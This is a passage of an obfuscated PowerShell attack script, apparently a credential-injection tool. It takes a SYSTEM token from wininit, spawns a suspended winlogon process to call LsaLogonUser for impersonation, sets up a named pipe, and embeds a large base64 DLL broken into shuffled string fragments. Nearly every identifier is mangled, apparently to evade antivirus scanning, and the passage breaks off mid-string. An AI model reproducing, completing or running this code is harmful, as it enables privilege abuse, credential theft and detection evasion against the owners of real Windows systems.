            ${PROCe`SSnam`ePTR} =  ( &("{2}{1}{0}"-f 'bLe','a','VARI')  ("z"+"fI"+"2wh")  -va )::("{1}{0}{2}{3}{4}" -f 'ing','Str','ToHG','lobalU','ni').Invoke("$($env:windir)\system32\winlogon.exe")

            ${SuC`C`Ess} = ${cReaT`EPro`Ces`SWIt`hTOk`e`Nw}."iN`Vo`KE"(${nE`W`htoken}, 0x0, ${Pro`CeS`s`NAMEPTR},   (  &("{2}{1}{0}"-f'IaBLE','ar','V')  ('Bq'+'ta')  )."V`AlUE"::"z`eRO", ${wI`N3`2c`onsTaNTS}."cRE`A`Te_`SUspenDEd",  (&("{1}{0}{2}" -f'BL','variA','e')  ("bQT"+"a")  )."vAl`UE"::"Z`ero",  (  &("{1}{0}"-f 'Ir','d') ('V'+'A'+'RIablE:bQTa') )."VAL`UE"::"z`eRo", ${stA`RT`UPi`Nf`oPTR}, ${p`RoCESSInF`oP`Tr})
            if (${suc`cE`ss})
            {
                
                ${PRoC`Es`si`NFo} =   ${Z`FI2wh}::"P`Trt`osTRu`cTUrE"(${PROc`ES`s`iNfOPtr}, [Type]${p`ROCEsS`_`i`Nf`OR`matiON})

                ${p`Ro`C`essiD} = ${GeTprO`CeS`SId}."i`NV`OKe"(${Proc`es`Si`NfO}."h`p`RoceSs")

                ${closE`HAnD`LE}."i`NvO`KE"(${P`Ro`cessInFo}."HpRO`C`Ess") | &("{2}{0}{1}"-f 't-Nu','ll','Ou')
                ${cLOse`han`dLe}."IN`VO`Ke"(${ProCeS`SIn`FO}."Hth`RE`AD") | &("{0}{1}"-f 'Ou','t-Null')
            }
            else
            {
                ${e`RRO`RcO`dE} =  (&("{1}{0}{2}"-f 'et-','G','Item')  ("{2}{1}{0}{3}"-f 'Fi','AriABLe:z','V','2Wh') )."Va`lue"::("{2}{0}{3}{4}{1}" -f'etLastWi','r','G','n32E','rro').Invoke()
                &("{3}{1}{0}{2}{4}" -f 'e-','it','Warn','Wr','ing') ('CreatePro'+'cessWi'+'t'+'hT'+'okenW'+' '+'fai'+'le'+'d. '+'Er'+'ro'+'r '+'code:'+' '+"$ErrorCode")
            }

            
             ( &("{1}{2}{0}" -f'e','VarIA','bl') ('ZF'+'I2'+'WH')  -vaLUeoNLy)::("{1}{0}{2}" -f 'reeHGl','F','obal').Invoke(${s`TA`RTUPi`Nfop`TR})
            ${STArTU`pin`FOPtr} =  ${b`Qta}::"z`erO"
              (  &("{0}{2}{1}" -f'V','abLe','aRI') ('z'+'FI2Wh') )."Va`LUe"::("{0}{1}{3}{2}"-f'Fr','eeHGl','bal','o').Invoke(${PrOC`e`ssInf`OPTR})
            ${proceSs`Inf`o`PTR} =   ( &("{1}{3}{2}{0}" -f'bLe','GET','IA','-VaR') ("{0}{1}" -f 'B','QTA') -VAl)::"Z`ErO"
              ${zF`I2`wh}::("{0}{2}{1}{5}{4}{6}{3}" -f 'Ze','o','r','icode','obalAllo','FreeGl','cUn').Invoke(${pRoC`E`SSn`AmEp`Tr})
            ${ProcEssN`Am`e`PtR} =  (&("{1}{2}{0}"-f 'IaBle','geT-','vaR') ("{0}{1}" -f'Bq','tA'))."VaL`Ue"::"ZE`RO"

            
            ${SucC`e`sS} = ${c`LoSehA`NDle}."i`N`VOke"(${NewHtO`K`eN})
            ${N`EwhTo`KEN} =  ( &('ls')  ("{3}{1}{2}{0}"-f ':BqTA','ri','abLe','Va') )."V`Alue"::"z`ERO"
            if (-not ${s`UccE`SS})
            {
                ${ERRo`R`COde} =   ${ZF`i2`wh}::("{3}{2}{0}{1}" -f'Win3','2Error','ast','GetL').Invoke()
                &("{3}{0}{2}{1}"-f'e-','ing','Warn','Writ') ('Clo'+'seH'+'an'+'dle '+'fai'+'led '+'to'+' '+'clos'+'e '+'NewHT'+'oken.'+' '+'E'+'rrorCode:'+' '+"$ErrorCode")
            }

            return ${Pro`CeS`sID}
        }
    }


    
    function CRe`ATe-w`InLogon`pr`OcESS
    {
        if (  (  &('Gi')  ("{0}{2}{1}{3}" -f 'V','iABlE:','Ar','1cTI85') )."Va`LuE"::"USEr`NaME" -ine ("{2}{1}{0}" -f'M','TE','SYS'))
        {
            
            ${SysTEmto`Ke`NI`NFo} = &("{3}{2}{1}{4}{0}"-f'ryToken','-P','t','Ge','rima') -ProcessId (&("{1}{0}{2}" -f '-Proce','Get','ss') ("{0}{2}{1}" -f'w','t','inini') | &("{1}{0}"-f're','whe') {${_}."sESsio`Nid" -eq 0})."Id"
            if (${S`y`ste`mtoKEN`inFO} -eq ${n`ULL} -or ${SY`s`TEMTOk`eni`N`Fo}."HP`ROc`TokeN" -eq   ( &("{0}{2}{1}" -f 'GET','lE','-vAriAB') ("{0}{1}" -f 'b','qtA') -VAL )::"ze`Ro")
            {
                &("{0}{1}{3}{2}" -f 'W','ri','e-Warning','t') ("{0}{3}{5}{1}{6}{2}{7}{4}" -f 'Unab',' SY','EM t','le t','n','o get','ST','oke')
            }
            else
            {
                ${p`ROcESS`iD} = &("{6}{1}{7}{5}{3}{4}{0}{2}"-f 'ogo','e','n','spendedW','inL','-Su','Cr','ate') -hToken ${sySt`e`m`TOke`NInFO}."hpR`OCto`k`EN"
                if (${Pro`cES`SId} -eq -1)
                {
                    Throw ("{5}{6}{10}{1}{7}{0}{4}{9}{3}{8}{2}" -f 'ende','eate','ess','go','d','Unabl','e',' susp','n proc',' WinLo',' to cr')
                }

                &("{0}{2}{1}{3}"-f'W','e-Ver','rit','bose') ('C'+'reate'+'d '+'suspend'+'ed'+' '+'wi'+'n'+'logon'+' '+'proc'+'e'+'ss. '+'Pr'+'oces'+'sI'+'d: '+"$ProcessId")
                return ${PRO`ce`ssId}
            }
        }
    }


    
    function cr`EAT`E-Na`MEDPiPE
    {
        ${pi`pEsecUR`i`TY} = &("{2}{1}{0}"-f 't','ec','new-obj') ("{4}{6}{0}{3}{1}{5}{2}" -f 's','m.IO.Pip','s.PipeSecurity','te','S','e','y')
        ${A`cCEsS`RUle} = &("{1}{0}{2}"-f 'w-Obj','Ne','ect') ("{6}{5}{2}{0}{1}{3}{4}" -f'.IO.P','ipes.P','m','ipeAcc','essRule','ste','Sy')( ((("{1}{3}{4}{2}{0}"-f 'YSTEM','N','UTHORITY6bDS','T ','A'))."r`Epla`CE"(([Char]54+[Char]98+[Char]68),[STRINg][Char]92)), ("{2}{1}{0}" -f 'te','adWri','Re'), ("{1}{0}"-f'llow','A') )
        ${pI`p`esECUR`ITy}.("{0}{2}{3}{1}"-f 'AddAc','Rule','ces','s').Invoke(${ACCEsS`R`U`LE})
        ${p`iPE}=&("{2}{1}{0}"-f 't','ec','new-obj') ("{3}{0}{1}{4}{5}{6}{2}" -f'IO','.Pi','medPipeServerStream','System.','pes','.','Na')(("{1}{0}" -f 'qsvc','s'),("{0}{1}"-f 'I','nOut'),100, ("{1}{0}" -f 'yte','B'), ("{1}{0}"-f 'one','N'), 1024, 1024, ${pIP`ese`cu`RITY})

        return ${P`ipE}
    }
    
    if( ${27`BN}::"C`UrRe`N`TTHr`EAD".("{5}{4}{0}{1}{3}{2}" -f'r','tme','State','nt','pa','GetA').Invoke() -ne 'STA') {
        &("{0}{1}{2}{3}"-f'Wr','ite-','Err','or') ("{10}{7}{2}{14}{9}{0}{5}{1}{12}{13}{15}{8}{6}{3}{4}{11}" -f'be ','n in ST','u','th -ST','A','ru','i','ipt m','h powershell.exe w','t ','Scr',' flag','A mode, relau','n','s','c') -ErrorAction ("{0}{1}" -f'Sto','p')
    }    

    
    if (${P`sCmd`leT}.ParamETERsETname -ieq ("{2}{1}{0}{3}" -f 'ogo','L','NewWin','n'))
    {
        if ( ( &("{1}{0}{2}" -f 'HILDi','C','TEm') ('VAr'+'iabl'+'e:B6d'+'083'))."val`UE"::("{0}{3}{1}{2}"-f 'GetCur','roc','ess','rentP').Invoke()."sEs`SION`Id" -eq 0)
        {
            &("{3}{0}{2}{1}" -f 'i','or','te-Err','Wr') ("{2}{9}{11}{0}{6}{12}{7}{15}{14}{8}{13}{10}{3}{4}{1}{5}" -f'not ','n','NewWinLogon ','es','sio',' 0','be u',' runn','in','m','S','ode can','sed when',' ','ng ','i') -ErrorAction ("{0}{1}"-f'St','op')
        }

        
        ${WI`NLoGo`NpR`oC`ESSId} = &("{3}{0}{2}{4}{1}" -f'WinLogon','ocess','P','Create-','r')
        &("{1}{0}{2}"-f'-Out','Write','put') ('Created'+' '+'w'+'inlog'+'on '+'pr'+'oc'+'ess '+'to'+' '+'cal'+'l '+'L'+'saLog'+'on'+'Us'+'er '+'in'+'. '+'K'+'ill '+'Proce'+'ssID'+' '+"$WinLogonProcessId "+'w'+'hen '+'done'+' '+'im'+'pe'+'rsonatin'+'g.')
        &("{2}{3}{1}{0}"-f't','utpu','Write','-O') ('Exe'+'cut'+'e: '+'S'+'top-Pro'+'ce'+'ss '+"$WinLogonProcessId "+'-forc'+'e')
    }
    elseif (${pSC`mdLeT}.paRamETERsEtnaME -ieq ("{3}{0}{2}{1}" -f 'tingWin','on','Log','Exis'))
    {
        ${pR`o`cE`ssES} = &("{0}{1}{2}"-f 'Ge','t-P','rocess') -Name ("{1}{2}{0}"-f 'n','winlog','o')
        if (${pRO`C`essEs} -is [system.array]) {
            ${Wi`NLoGONPro`C`Ess`iD} = ${Pro`cesS`eS}[0]."i`d"
        }
        else {
            ${Win`Lo`g`on`PrOCEsSID} = ${p`RoCe`sS`eS}."I`d"
        }
    }

    
    [Byte]${lOGoNT`YPe`NuM} = 0x0
    switch (${LoGON`TY`pe})
    {
        ("{2}{3}{1}{0}" -f'e','ctiv','I','ntera') {${lOG`O`NtyPeNum} = 2}
        ("{0}{4}{3}{2}{1}"-f 'Net','t','rtex','a','workCle') {${lo`g`oN`Type`Num} = 8}
        ("{0}{2}{1}{3}" -f 'Rem','teInter','o','active') {${LOG`O`NT`ypeNUM} = 10}
    }

    ${A`UtHPa`CkAgEN`Um} = 0
    
    switch (${auThP`Ac`KagE})
    {
        ("{0}{1}{2}" -f'Msv1','_','0') {${A`U`ThpACka`GE`Num} = 1}
        ("{2}{1}{0}"-f 'eros','b','Ker') {${AUt`HP`Ac`kA`GEnUM} = 2}
    }


    
    try
    {
        ${p`ipE} = &("{0}{3}{2}{1}"-f'Crea','dPipe','e-Name','t')

        
        ${LogON32bi`T_b`A`Se64} = ("{112}{11}{101}{9}{103}{84}{71}{0}{15}{12}{3}{43}{33}{109}{104}{44}{20}{25}{32}{66}{115}{88}{19}{83}{1}{2}{52}{102}{72}{13}{34}{58}{80}{49}{55}{74}{16}{21}{59}{98}{36}{54}{91}{38}{68}{50}{111}{85}{4}{29}{113}{63}{114}{30}{64}{106}{57}{23}{35}{28}{95}{61}{108}{53}{48}{47}{14}{96}{73}{10}{107}{27}{110}{37}{62}{99}{46}{7}{76}{65}{79}{42}{93}{77}{45}{18}{40}{70}{87}{39}{92}{67}{41}{51}{94}{86}{56}{5}{26}{82}{90}{105}{24}{97}{17}{81}{60}{78}{89}{6}{22}{31}{69}{8}{100}{75}" -f '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','M8CNffCrq6uL8+m2/v//O8oPjxkCAAArVdyNdeSJVdCNffCLwqWZg+IfA8LB+AWliUXEi0XQpSUfAACAeQVIg8jgQIlF0IPP/4vHiV3gi33Qi8/T4PfQaiCJRdhYK8dqA4lFyF6LVJ3wi8+LwtPqC1XgI0XYi03I0+CJVJ3wQ4lF4DvefN+LRcSNVfjB4AIz22oCK9CDz/+LRcRZO8h8C4sCiUSN8ItFxOsEiVyN8IPqBEl554tNzEGLwZmD4h8D0MH6BYlV1IHhHwAAgHkFSYPJ4EFqH1grwYlF0DPAi03QQNPghUSV8A+EkgAAAIvH0+D30IVElfDrBDlclfB1B0I71nz163aLfcyLx2ofmVkj0QPQwfoFgecfAACAeQVPg8/gR4tElfArzzP/R9Pni8uJfdwD+Il94','AAAAAAAAAAAAAAAAAAAAAAD/////AAAAAAAAAAAAAAAA7L0AEOy9ABDsvQAQ7L0AEOy9ABDsvQAQ7L0AEOy9ABDsvQAQ7L0AEAAAAAABAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQAAAAAAAAICAg','WQ5bDl0OXw5hDmMOZQ5nDmkOaw5tDm8OcQ5zDnUOdw55DnsOfQ5/DkEOgw6FDocOiQ6LDo0Ojw6RDpMOlQ6XDpkOmw6dDp8OoQ6jDqUOpw6pDqsOrQ6vDrEOsw61DrcOuQ67Dr0Ovw6BD8IPww/ED8UPxg/HD8gPyQ/KD8sPzA/ND84Pzw/QD9EP0g/TD9QP1Q/WD9cP2A/ZD9oP2w/cD90P3g/fD+QP5Q/mD+cP6A/pD+oP6w/sD+0P7g/4D/kP+g/7D8AEAEAWAAAAAQwCDD4NPw0ADUENSQ1LDU0NTw1RDVMNVQ1XDVkNWw1dDV8NYQ1jDWUNZw1pDWsNbQ1vDXENcw11DWEP4g/jD+QP8w/1D/cP+Q/7D/0P/w/ACABAIwDAAAEMAwwFDAcMCQwLDA0MDwwRDBMMFQwXDBkMGwwdDB8MIQwjDCUMJwwpDCsMLQwvDDEMMww1DDcMOQw7DD0MPwwBDEMMRQxHDEkMSwxNDE8MUQxTDFUMVwxZDFsMXQxfDGEMYwxlDGcMaQxrDG0MbwxxDHMMdQx3DHkMewx9DH8MQQyDDIUMhwyJDIsMjQyPDJEMkwyVDJcMmQybDJ0MnwyhDKMMpQynDKkMqwytDK8M','AAAGYAYQAtAEkAUgAAAHYAaQAtAFYATgAAAGgAeQAtAEEATQAAAGEAegAtAEEAWgAtAEwAYQB0AG4AAAAAAGUAdQAtAEUAUwAAAG0AawAtAE0ASwAAAHQAbgAtAFoAQQAAAHgAaAAtAFoAQQAAAHoAdQAtAFoAQQAAAGEAZgAtAFoAQQAAAGsAYQAtAEcARQAAAGYAbwAtAEYATwAAAGgAaQAtAEkATgAAAG0AdAAtAE0AVAAAAHMAZQAtAE4ATwAAAG0AcwAtAE0AWQAAAGsAawAtAEsAWgAAAGsAeQAtAEsARwAAAHMAdwAtAEsARQAAAHUAegAtAFUAWgAtAEwAYQB0AG4AAAAAAHQAdAAtAFIAVQAAAGIAbgAtAEkATgAAAHAAYQAtAEkATgAAAGcAdQAtAEkATgAAAHQAYQAtAEkATgAAAHQAZQAtAEkATgAAAGsAbgAtAEkATgAAAG0AbAAtAEkATgAAAG0AcgAtAEkATgAAAHMAYQAtAEkATgAAAG0AbgAtAE0ATgAAAGMAeQAtAEcAQgAAAGcAbAAtAEUAUwAAAGsAbwBrAC0ASQBOAAAAAABzAHkAcgAtAFMAWQAAAAAAZABpAHYALQBNAFYAAAAAAHEAdQB6AC0AQgBPAAAAAABuAHMALQBaAEEAAABtAGkALQBOAFoAAABhAHIALQBJAFEAAABkAGUALQBDAEgAAABlAG4ALQBHAEIAAABlAHMALQBNAFgAAABmAHIALQBCAEUAAABpAHQALQBDAEgAAABuAGwALQBCAEUAAABuAG4ALQBOAE8AAABwAHQALQBQAFQAAABzAHIALQBTAFAALQBMAGEAdABuAAAAAABzAHYALQBGAEkAAABhAHoALQBBAFoALQBDAHkAcgBsAAAAAABzAGUALQBTAEUAAABtAHMALQBCAE4AAAB1AHoALQBVAFoALQBDAHkAcgBsAAAAAABxAHUAegAtAEUAQwAAAAAAYQByAC0ARQBHAAAAegBoAC0ASABLAAAAZABlAC0AQQBUAAAAZQBuAC0AQQBVAAAAZQBzAC0ARQBTAAAAZgByAC0AQwBBAAAAcwByAC0AUwBQAC0AQwB5AHIAbAAAAAAAcwBlAC0ARgBJAAAAcQB1AHoALQBQAEUAAAAAAGEAcgAtAEwAWQAAAHoAaAAtAFMARwAAAGQAZQAtAEwAVQAAAGUAbgAtAEMAQQAAAGUAcwAtAEcAVAAAAGYAcgAtAEMASAAAAGgAcgAtAEIAQQAAAHMAbQBqAC0ATgBPAAAAAABhAHIALQBEAFoAAAB6AGgALQBNAE8AAABkAGUALQBMAEkAAABlAG4ALQBOAFoAAABlAHMALQBDAFIAAABmAHIALQBMAFUAAABiAHMALQBCAEEALQBMAGEAdABuAAAAAABzAG0AagAtAFMARQAAAAAAYQByAC0ATQBBAAAAZQBuAC0ASQBFAAAAZQBzAC0AUABBAAAAZgByAC0ATQBDAAAAcwByAC0AQgBBAC0ATABhAHQAbgAAAAAAcwBtAGEALQBOAE8AAAAAAGEAcgAtAFQATgAAAGUAbgAtAFoAQQAAAGUAcwAtAEQATwAAAHMAcgAtAEIAQQAtAEMAeQByAGwAAAAAAHMAbQBhAC0AUwBFAAAAAABhAHIALQBPAE0AAABlAG4ALQBKAE0AAABlAHMALQBWAEUAAABzAG0AcwAtAEYASQAAAAAAYQByAC0AWQBFAAAAZQBuAC0AQwBCAAAAZQBzAC0AQwBPAAAAcwBtAG4ALQBGAEkAAAAAAGEAcgAtAFMAWQAAAGUAbgAtAEIAWgAAAGUAcwAtAFAARQAAAGEAcgAtAEoATwAAAGUAbgAtAFQAVAAAAGUAcwAtAEEAUgAAAGEAcgAtAEwAQgAAAGUAbgAtAFoAVwAAAGUAcwAtAEUAQwAAAGEAcgAtAEsAVwAAAGUAbgAtAFAASAAAAGUAcwAtAEMATAAAAGEAcgAtAEEARQAAAGUAcwAtAFUAWQAAAGEAcgAtAEIASAAAAGUAcwAtAFAAWQAAAGEAcgAtAFEAQQAAAGUAcwAtAEIATwAAAGUAcwAtAFMAVgAAAGUAcwAtAEgATgAAAGUAcwAtAE4ASQAAAGUAcwAtAFAAUgAAAHoAaAAtAEMASABUAAAAAABzAHIAAAAAAGEAZgAtAHoAYQAAAGEAcgAtAGEAZQAAAGEAcgAtAGIAaAAAAGEAcgAtAGQAegAAAGEAcgAtAGUAZwAAAGEAcgAtAGkAcQAAAGEAcgAtAGoAbwAAAGEAcgAtAGsAdwAAAGEAcgAtAGwAYgAAAGEAcgAtAGwAeQAAAGEAcgAtAG0AYQAAAGEAcgAtAG8AbQAAAGEAcgAtAHEAYQAAAGEAcgAtAHMAYQAAAGEAcgAtAHMAeQAAAGEAcgAtAHQAbgAAAGEAcgAtAHkAZQAAAGEAegAtAGEAegAtAGMAeQByAGwAAAAAAGEAegAtAGEAegAtAGwAYQB0AG4AAAAAAGIAZQAtAGIAeQAAAGIAZwAtAGIAZwAAAGIAbgAtAGkAbgAAAGIAcwAtAGIAYQAtAGwAYQB0AG4AAAAAAGMAYQAtAGUAcwAAAGMAcwAtAGMAegAAAGMAeQAtAGcAYgAAAGQAYQAtAGQAawAAAGQAZQAtAGEAdAAAAGQAZQAtAGMAaAAAAGQAZQAtAGQAZQAAAGQAZQAtAGwAaQAAAGQAZQAtAGwAdQAAAGQAaQB2AC0AbQB2AAAAAABlAGwALQBnAHIAAABlAG4ALQBhAH','w7+DsAPEQ8WDxoPHg8gDyIPJA8lDycPLA8uDzMPNQ86DzwPPg8AD0EPQg9ED0kPSw